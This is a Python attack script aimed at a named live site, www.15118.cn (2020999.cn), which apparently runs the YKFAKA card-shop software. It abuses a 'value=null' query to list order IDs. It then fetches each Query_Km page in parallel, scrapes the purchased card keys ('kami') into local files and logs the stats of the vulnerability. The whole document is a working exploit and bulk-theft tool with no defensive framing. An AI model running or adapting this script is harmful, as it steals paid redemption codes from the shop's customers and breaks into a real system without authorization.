#!/usr/bin/env python3
"""Dump kami via YKFAKA null session + Query_Km/{ddid} on www.15118.cn (2020999.cn)."""
from __future__ import annotations

import json
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

BASE = "https://www.15118.cn"
OUT = Path("/workspace/2020999/results/dump")
OUT.mkdir(parents=True, exist_ok=True)
(OUT / "km_pages").mkdir(exist_ok=True)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36"
LOG = OUT / "dump.log"


def log(msg: str) -> None:
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    with LOG.open("a") as f:
        f.write(line + "\n")


def parse_km(ddid: str, html: str) -> dict | None:
    if "请求非法" in html:
        return {"ddid": ddid, "status": "illegal", "kami": []}
    if "订单详情" not in html and "卡密" not in html:
        return {"ddid": ddid, "status": "unknown", "kami": [], "title": (re.findall(r"<title>([^<]+)", html) or [""])[0]}
    kami: list[str] = []
    m = re.search(r'id="target"[^>]*>([\s\S]*?)</div>', html)
    if m:
        block = re.sub(r"<br\s*/?>", "\n", m.group(1), flags=re.I)
        for line in re.sub(r"<[^>]+>", "\n", block).splitlines():
            line = line.strip()
            if line and line not in ("复制", "导出", "卡密"):
                kami.append(line)
    for m in re.findall(r'data-clipboard-text="([^"]+)"', html):
        if len(m) >= 4:
            kami.append(m.strip())
    for m in re.findall(r"<(?:pre|textarea)[^>]*>([\s\S]*?)</(?:pre|textarea)>", html, re.I):
        t = re.sub(r"<[^>]+>", "", m).strip()
        if t and len(t) > 3:
            kami.append(t)
    for m in re.finditer(r"卡密[^:：]*[:：]?</td>\s*<td[^>]*>([\s\S]*?)</td>", html):
        t = re.sub(r"<[^>]+>", "", m.group(1)).strip()
        if t:
            kami.append(t)
    block = re.search(r"卡密信息([\s\S]{0,4000})", html)
    if block:
        t = re.sub(r"<script[\s\S]*?</script>", " ", block.group(1), flags=re.I)
        t = re.sub(r"<[^>]+>", "\n", t)
        for line in t.splitlines():
            line = line.strip()
            if line and line not in ("复制", "导出", "卡密", "查看卡密"):
                kami.append(line)
    seen: set[str] = set()
    uniq: list[str] = []
    for k in kami:
        if k and k not in seen:
            seen.add(k)
            uniq.append(k)
    status = "paid" if uniq else ("empty" if "订单详情" in html else "unknown")
    return {"ddid": ddid, "status": status, "kami": uniq}


def main() -> None:
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "zh-CN,zh;q=0.9"})

    # establish null session
    r = s.get(BASE + "/Query.html", timeout=30)
    tok = re.search(r'name="__token__"\s+value="([^"]+)"', r.text)
    if not tok:
        raise SystemExit("no token")
    pr = s.post(
        BASE + "/Query.html",
        data={"value": "null", "page": "1", "__token__": tok.group(1)},
        headers={"Referer": BASE + "/Query.html"},
        timeout=90,
    )
    (OUT / "null_page1.html").write_text(pr.text)
    ddids = sorted(set(re.findall(r"/Query_Km/([A-Fa-f0-9]{12})", pr.text)))
    (OUT / "ddids.txt").write_text("\n".join(ddids) + "\n")
    log(f"null bytes={len(pr.text)} ddids={len(ddids)}")
    if not ddids:
        raise SystemExit("no ddids")

    # reuse cookie jar for workers via thread-local sessions copying cookies
    cookies = s.cookies.get_dict()

    def fetch(ddid: str):
        ss = requests.Session()
        ss.headers.update(
            {
                "User-Agent": UA,
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Referer": BASE + "/Query.html",
            }
        )
        ss.cookies.update(cookies)
        try:
            rr = ss.get(BASE + "/Query_Km/" + ddid, timeout=25)
            (OUT / "km_pages" / f"{ddid}.html").write_text(rr.text, errors="ignore")
            return parse_km(ddid, rr.text)
        except Exception as e:
            return {"ddid": ddid, "status": "error", "kami": [], "error": str(e)}

    hits = 0
    empty = 0
    fail = 0
    cards_path = OUT / "cards.tsv"
    full_path = OUT / "cards_full.jsonl"
    if cards_path.exists():
        cards_path.unlink()
    if full_path.exists():
        full_path.unlink()

    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(fetch, d): d for d in ddids}
        done = 0
        for fut in as_completed(futs):
            rec = fut.result()
            done += 1
            with full_path.open("a") as f:
                f.write(json.dumps(rec, ensure_ascii=False) + "\n")
            if rec and rec.get("kami"):
                hits += 1
                with cards_path.open("a") as f:
                    for k in rec["kami"]:
                        f.write(f"{rec['ddid']}\t{k}\n")
                if hits <= 5 or hits % 25 == 0:
                    log(f"HIT {rec['ddid']} {rec['kami'][0][:80]}")
            elif rec and rec.get("status") == "empty":
                empty += 1
            else:
                fail += 1
            if done % 50 == 0 or done == len(ddids):
                log(f"progress {done}/{len(ddids)} hits={hits} empty={empty} fail={fail}")

    lines = sum(1 for _ in cards_path.open()) if cards_path.exists() else 0
    stats = {
        "target": "https://2020999.cn/ → https://www.15118.cn/",
        "framework": "YKFAKA",
        "vuln": "POST Query.html value=null → Query_Km/{12hex}",
        "ddids": len(ddids),
        "with_kami": hits,
        "empty": empty,
        "fail": fail,
        "card_lines": lines,
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    (OUT / "STATS.json").write_text(json.dumps(stats, ensure_ascii=False, indent=2))
    log(f"DONE {stats}")


if __name__ == "__main__":
    main()
